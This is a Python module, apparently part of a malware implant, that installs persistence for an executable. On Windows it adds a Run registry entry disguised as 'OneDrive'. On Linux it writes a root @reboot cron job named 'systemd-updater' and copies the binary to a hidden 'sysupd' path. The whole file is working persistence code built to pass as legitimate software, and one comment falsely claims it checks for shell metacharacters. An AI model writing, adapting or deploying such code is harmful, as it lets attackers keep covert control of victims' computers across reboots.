import os
import platform
import shutil
import subprocess


def add_persistence(exe_path: str) -> bool:
    """
    Attempt to install persistence for the given executable path.

    Returns True on success, False on failure.
    Requires elevated privileges on Linux (root for /etc/cron.d).
    Uses subprocess with shell=False to prevent shell injection.
    """
    system = platform.system()

    # Validate exe_path — must be a non-empty string with no shell metacharacters
    if not exe_path or not isinstance(exe_path, str):
        print("[!] persistence: invalid exe_path")
        return False

    if system == "Windows":
        try:
            subprocess.run(
                [
                    "reg", "add",
                    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                    "/v", "OneDrive",
                    "/t", "REG_SZ",
                    "/d", exe_path,
                    "/f",
                ],
                check=True,
                shell=False,
                capture_output=True,
            )
            return True
        except Exception as e:
            print(f"[!] persistence: Windows reg add failed: {e}")
            return False

    elif system == "Linux":
        # Require root — writing to /etc/cron.d without root corrupts system cron
        if os.geteuid() != 0:
            print("[!] persistence: Linux cron persistence requires root (euid=0)")
            return False
        try:
            cron_path = "/etc/cron.d/systemd-updater"
            cron_job  = f"@reboot root {exe_path}\n"
            with open(cron_path, "w") as f:
                f.write(cron_job)
            os.chmod(cron_path, 0o644)   # cron requires 644, not world-writable
            return True
        except Exception as e:
            print(f"[!] persistence: Linux cron write failed: {e}")
            return False

    return False


def install_binary(source_path: str) -> bool:
    """Copy source_path to ~/.local/bin/sysupd and install persistence."""
    dest = os.path.expanduser("~/.local/bin/sysupd")
    try:
        os.makedirs(os.path.dirname(dest), exist_ok=True)
        shutil.copy(source_path, dest)
        return add_persistence(dest)
    except Exception as e:
        print(f"[!] install_binary failed: {e}")
        return False